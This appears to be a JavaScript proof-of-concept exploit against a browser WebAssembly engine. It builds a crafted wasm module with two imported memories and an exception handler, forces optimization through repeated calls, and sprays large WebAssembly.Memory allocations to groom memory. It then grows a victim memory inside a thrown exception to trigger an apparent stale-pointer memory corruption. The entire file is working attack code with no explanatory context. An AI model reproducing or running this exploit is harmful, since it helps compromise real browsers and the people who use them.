const global_memory0 = new WebAssembly.Memory({
  initial: 1,
  maximum: 1
});
const memory1_test = new WebAssembly.Memory({
  initial: 1,
  maximum: 65536
});
var victim_memory = null;

function mkinst(thrower, memory1) {
  inst = new WebAssembly.Instance(mod, {
    mod: {
      thrower: thrower,
      mem0: global_memory0,
      mem1: memory1
    }
  });
} // const builder = new WasmModuleBuilder();
// builder.addType(makeSig([], []));
// builder.addType(makeSig([], [kWasmI32]));
// builder.addImport('mod', 'thrower', 0 /* sig */);
// builder.addImportedMemory('mod', 'mem0', 1, 1, false, false);
// builder.addImportedMemory('mod', 'mem1', 1, 65536, false, false);
// builder.addFunction(undefined, 1 /* sig */)
//   .addBodyWithEnd([
//     kExprI32Const, 0x0,
//     kExprI32Const, 0x2b,
//     kExprI32StoreMem, 0x40, 0x01, 0x00,
//     kExprTry, 0x40,
//       kExprCallFunction, 0x00,
//     kExprCatchAll, 
//       kExprI32Const, 0x0,
//       kExprI32Const, 0x2a, 
//       kExprI32StoreMem, 0x40, 0x01, 0x00,
//       kExprEnd,
//     kExprI32Const, 0x0,
//     kExprI32LoadMem, 0x40, 0x01, 0x00,
//     kExprEnd,
// ]);
// builder.addExport('bad', 1);
// builder.toBuffer();


wire = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 8, 2, 96, 0, 0, 96, 0, 1, 127, 2, 43, 3, 3, 109, 111, 100, 7, 116, 104, 114, 111, 119, 101, 114, 0, 0, 3, 109, 111, 100, 4, 109, 101, 109, 48, 2, 1, 1, 1, 3, 109, 111, 100, 4, 109, 101, 109, 49, 2, 1, 1, 128, 128, 4, 3, 2, 1, 1, 7, 7, 1, 3, 98, 97, 100, 0, 1, 10, 32, 1, 30, 0, 65, 0, 65, 43, 54, 64, 1, 0, 6, 64, 16, 0, 25, 65, 0, 65, 42, 54, 64, 1, 0, 11, 65, 0, 40, 64, 1, 0, 11]);

function mkmod() {
  mod = new WebAssembly.Module(wire);
  mkinst(function () {}, memory1_test);

  for (let i = 0; i < 300000; i++) {
    inst.exports.bad();
  }
}

var small_spray = [];
var mid_spray = [];
var large_spray = [];

function run() {
  mkmod();
  var hole = new WebAssembly.Memory({
    initial: 1,
    maximum: 512 * 1024 / 64
  }); // 512 M

  var smallsz = 512 * 1024 / 64 / 32; //16M

  var midsz = 512 * 1024 / 64 / 16; // 32M

  var largesz = 512 * 1024 / 64 / 8; // 64M

  var small_amount = 0;

  while (1) {
    try {
      var small = new WebAssembly.Memory({
        initial: smallsz - 1,
        maximum: smallsz
      });
      small_spray.push(small);
      small_amount = small_amount + 1;
    } catch (e) {
      console.log(e); //RangeError: WebAssembly.Memory(): could not allocate memory

      break;
    }
  }

  console.log("spary small_amount: " + small_amount);
  hole = null;

  for (let i = 0; i < 8; i++) {
    var small = new WebAssembly.Memory({
      initial: smallsz - 1,
      maximum: smallsz
    });
    small_spray.push(small);
  }

  for (let i = 0; i < 4; i++) {
    var mid = new WebAssembly.Memory({
      initial: 1,
      maximum: midsz
    });
    mid_spray.push(mid);
  }

  for (let i = 0; i < 4; i++) {
    var large = new WebAssembly.Memory({
      initial: 1,
      maximum: largesz
    });
    large_spray.push(large);
  }

  while (1) {
    try {
      var small = new WebAssembly.Memory({
        initial: smallsz - 1,
        maximum: smallsz
      });
      small_spray.push(small);
    } catch (e) {
      console.log(e); //RangeError: WebAssembly.Memory(): could not allocate memory

      break;
    }
  }

  var maxsize = Math.floor(midsz * 4 / 3);

  function thrower() {
    victim_memory.grow(maxsize - 1);
    throw 'bleh';
  }

  mid_spray[0] = null;
  victim_memory = new WebAssembly.Memory({
    initial: 1,
    maximum: maxsize
  });
  mkinst(thrower, victim_memory);
  large_spray[0] = null;
  inst.exports.bad();
  return;
}

run();